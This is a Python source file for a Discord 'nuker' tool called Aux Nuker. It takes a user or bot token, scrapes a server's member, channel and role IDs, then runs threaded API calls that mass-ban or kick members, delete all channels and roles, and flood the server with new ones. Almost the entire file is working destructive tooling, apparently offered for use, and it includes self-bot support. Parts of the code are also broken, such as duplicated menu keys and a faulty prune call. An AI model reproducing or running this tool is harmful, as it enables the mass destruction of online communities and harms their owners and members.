import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

os.system(f'cls & mode 115,30 & title Aux Nuker - Authentication')

token = input(f'\x1b[31;5;56m[-] \033[97mDiscord Authorization Token\x1b[31;5;56m: \033[97m')
rich_presence = input(f'\x1b[31;5;56m[-] \033[97mDiscord Rich Presence (\x1b[31;5;56mY\033[97m/\x1b[31;5;56mN\033[97m)\x1b[31;5;56m: \033[97m')

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("846124907908825088") 
            RPC.connect() 
            RPC.update(details="Connected", large_image="aux", small_image="discord", large_text="Aux Nuker - v1.2.2", start=time.time())
        except:
            pass

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class Avery:

    def __init__(self):
        self.colour = '\x1b[31;5;56m'

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[97m+{self.colour}]\033[97m Aux Nuker: Successfully Banned{self.colour} {member.strip()}\033[97m")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[97m+{self.colour}]\033[97mAux Nuker: Successfully kicked{self.colour} {member.strip()}\033[97m")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[97m+{self.colour}]\033[97mAux Nuker: Successfully deleted channel{self.colour}{channel.strip()}\033[97m")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[97m+{self.colour}]\033[97mAux Nuker: Successfully deleted role{self.colour} {role.strip()}\033[97m")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[97m+{self.colour}]\033[97mAux Nuker: Successfully created channel{self.colour} {name}\033[97m")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[97m+{self.colour}]\033[97mAux Nuker: Successfully created role{self.colour} {name}\033[97m")
                    break
                else:
                    break

    async def Scrape(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Aux Scraper/Discord Members.txt")
            os.remove("Aux Scraper/Discord Channels.txt")
            os.remove("Aux Scraper/Discord Roles.txt")
        except:
            pass

        membercount = 0
        with open('Aux Scraper/Discord Members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{self.colour}[\033[97m!{self.colour}]\033[97mAux Nuker: Successfully scraped {self.colour}{membercount}\033[97m guild members")
            m.close()

        channelcount = 0
        with open('Aux Scraper/Discord Channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{self.colour}[\033[97m!{self.colour}]\033[97mAux Nuker: Successfully scraped {self.colour}{channelcount}\033[97m text channels")
            c.close()

        rolecount = 0
        with open('Aux Scraper/Discord Roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{self.colour}[\033[97m!{self.colour}]\033[97mAux Nuker: Successfully scraped {self.colour}{rolecount}\033[97m guild roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{self.colour}> \033[97mAux Nuker | Please Enter The Guild ID{self.colour}: \033[97m')
        channel_name = input(f"{self.colour}> \033[97mAux Nuker | Please Enter The Channel Names{self.colour}: \033[97m")
        channel_amount = input(f"{self.colour}> \033[97mAux Nuker | Please Enter The Channel Amount{self.colour}: \033[97m")
        role_name = input(f"{self.colour}> \033[97mAux Nuker | Please Enter The Role Names{self.colour}: \033[97m")
        role_amount = input(f"{self.colour}> \033[97mAux Nuker | Please Enter The Role Amount{self.colour}: \033[97m")
        print()

        members = open('Aux Scraper/Discord Members.txt')
        channels = open('Aux Scraper/Discord Channels.txt')
        roles = open('Aux Scraper/Discord Roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        print()
        members = open('Aux Scraper/Discord Members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        print()
        members = open('Aux Scraper/Discord Members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        print()
        channels = open('Aux Scraper/Discord Channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        print()
        roles = open('Aux Scraper/Discord Roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        name = input(f"{self.colour}> \033[97mChannel Names{self.colour}: \033[97m")
        amount = input(f"{self.colour}> \033[97mAmount{self.colour}: \033[97m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        name = input(f"{self.colour}> \033[97mRole Names{self.colour}: \033[97m")
        amount = input(f"{self.colour}> \033[97mAmount{self.colour}: \033[97m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def PruneMembers(self):
        guild = input(f'{self.colour}> \033[97mGuild ID{self.colour}: \033[97m')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

    def Credits(self):
        os.system(f'cls & mode 115,30 & title Aux Nuker - Credits Tab')
        print(f'''
                          {self.colour}
                          \033[31m   ▄████████ ███    █▄  ▀████    ▐████▀ 
                          \033[97m  ███    ███ ███    ███   ███▌   ████▀  
                          \033[31m  ███    ███ ███    ███    ███  ▐███    
                          \033[31m  ███    ███ ███    ███    ▀███▄███▀    
                          \033[97m▀███████████ ███    ███    ████▀██▄     
                          \033[31m  ███    ███ ███    ███   ▐███  ▀███    
                          \033[97m  ███    ███ ███    ███  ▄███     ███▄  
                          \033[31m  ███    █▀  ████████▀  ████       ███▄ 

                            {self.colour}[\033[97mDiscord User:{self.colour}   ] \033[97maux#1337
                            {self.colour}[\033[97mDiscord User ID:{self.colour}] \033[97m827030749119119360
                            {self.colour}[\033[97mDiscord Guild:{self.colour}  ] \033[97mdiscord.gg/dhYEkDBtu5
                            {self.colour}[\033[97mGithub User:{self.colour}    ] \033[97mAirpIane
        \033[97m''')

    async def ThemeChanger(self):
        os.system(f'cls & mode 115,30 & title Aux Nuker - Customization Tab')
        print(f'''
                          {self.colour}
                          \033[31m   ▄████████ ███    █▄  ▀████    ▐████▀ 
                          \033[97m  ███    ███ ███    ███   ███▌   ████▀  
                          \033[31m  ███    ███ ███    ███    ███  ▐███    
                          \033[31m  ███    ███ ███    ███    ▀███▄███▀    
                          \033[97m▀███████████ ███    ███    ████▀██▄     
                          \033[31m  ███    ███ ███    ███   ▐███  ▀███    
                          \033[97m  ███    ███ ███    ███  ▄███     ███▄  
                          \033[31m  ███    █▀  ████████▀  ████       ███▄    

      {self.colour}        ╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[97m
      {self.colour}        ║ \033[97m[{self.colour}1\033[97m] \033[97mRed               {self.colour}║\033[97m [{self.colour}5\033[97m] \033[97mPurple            {self.colour}║\033[97m [{self.colour}9\033[97m] \033[97mGrey              {self.colour}║\033[97m
      {self.colour}        ║ \033[97m[{self.colour}2\033[97m] \033[97mGreen             {self.colour}║\033[97m [{self.colour}6\033[97m] \033[97mBlue              {self.colour}║\033[97m [{self.colour}0\033[97m] \033[97mPeach             {self.colour}║\033[97m
      {self.colour}        ║ \033[97m[{self.colour}3\033[97m] \033[97mYellow            {self.colour}║\033[97m [{self.colour}7\033[97m] \033[97mPink              {self.colour}║\033[97m [{self.colour}M\033[97m] \033[97mMenu              {self.colour}║\033[97m
      {self.colour}        ║ \033[97m[{self.colour}4\033[97m] \033[97mOrange            {self.colour}║\033[97m [{self.colour}8\033[97m] \033[97mCyan              {self.colour}║\033[97m [{self.colour}X\033[97m] \033[97mExit              {self.colour}║\033[97m
      {self.colour}        ╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[97m
             
        \033[97m''')
        choice = input(f'{self.colour}> \033[97mPlease input your desired option choice{self.colour}: \033[97m')

        if choice == '1':
            self.colour = '\x1b[31;5;196m'
            await self.ThemeChanger()
        elif choice == '2':
            self.colour = '\x1b[31;5;34m'
            await self.ThemeChanger()
        elif choice == '3':
            self.colour = '\x1b[31;5;142m'
            await self.ThemeChanger()
        elif choice == '4':
            self.colour = '\x1b[31;5;172m'
            await self.ThemeChanger()
        elif choice == '5':
            self.colour = '\x1b[31;5;56m'
            await self.ThemeChanger()
        elif choice == '6':
            self.colour = '\x1b[31;5;21m'
            await self.ThemeChanger()
        elif choice == '7':
            self.colour = '\x1b[31;5;201m'
            await self.ThemeChanger()
        elif choice == '8':
            self.colour = '\x1b[31;5;51m'
            await self.ThemeChanger()
        elif choice == '9':
            self.colour = '\x1b[31;5;103m'
            await self.ThemeChanger()
        elif choice == '0':
            self.colour = '\x1b[31;5;209m'
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)
                          
    async def Menu(self):
        os.system(f'cls & mode 98,26 & title Aux Nuker - Dashboard - Connected: {client.user}')
        print(f'''
                          {self.colour}
                          \033[31m   ▄████████ ███    █▄  ▀████    ▐████▀ 
                          \033[97m  ███    ███ ███    ███   ███▌   ████▀  
                          \033[31m  ███    ███ ███    ███    ███  ▐███    
                          \033[31m  ███    ███ ███    ███    ▀███▄███▀    
                          \033[97m▀███████████ ███    ███    ████▀██▄     
                          \033[31m  ███    ███ ███    ███   ▐███  ▀███    
                          \033[97m  ███    ███ ███    ███  ▄███     ███▄  
                          \033[31m  ███    █▀  ████████▀  ████       ███▄   

                    \033[97m This application was developed by aux#1337 & K1NS#1191.
                    \033[97m    If you bought this application you were scammed!                               

      {self.colour}        ╔═════════════════════════════════════════════════════════════════════╗\033[97m
      {self.colour}        ║ \033[97m[{self.colour}B\033[97m] \033[97mSoft-Ban Members       {self.colour}║\033[97m [{self.colour}N\033[97m] \033[97mRemove Channels  {self.colour}║\033[97m [{self.colour}9\033[97m] \033[97mScrape      {self.colour}║\033[97m
      {self.colour}        ║ \033[97m[{self.colour}E\033[97m] \033[97mSoft-Kick Members      {self.colour}║\033[97m [{self.colour}U\033[97m] \033[97mMass Roles       {self.colour}║\033[97m [{self.colour}A\033[97m] \033[97mCustom      {self.colour}║\033[97m
      {self.colour}        ║ \033[97m[{self.colour}S\033[97m] \033[97mSoft-Prune Members     {self.colour}║\033[97m [{self.colour}K\033[97m] \033[97mMass Channels    {self.colour}║\033[97m [{self.colour}U\033[97m] \033[97mInfo        {self.colour}║\033[97m
      {self.colour}        ║ \033[97m[{self.colour}T\033[97m] \033[97mRemove Roles           {self.colour}║\033[97m [{self.colour}E\033[97m] \033[97mBomb Server      {self.colour}║\033[97m [{self.colour}X\033[97m] \033[97mExit        {self.colour}║\033[97m
      {self.colour}        ╚═════════════════════════════════════════════════════════════════════╝\033[97m
             
        \033[97m''')


        choice = input(f'{self.colour}> \033[97mPlease input your desired option{self.colour}: \033[97m')
        if choice == 'B':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == 'E':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == 'S':
            await PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == 'T':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == 'N':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == 'U':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == 'K':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == 'E':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == 'A':
            await self.ThemeChanger()
        elif choice == 'U' or choice == 'u':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await Avery().Menu()
            
    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{self.colour}> \033[97mAux Nuker: This token is either expired or is currently invalidated.')
            input()
            os._exit(0)

if __name__ == "__main__":
    Avery().Startup()
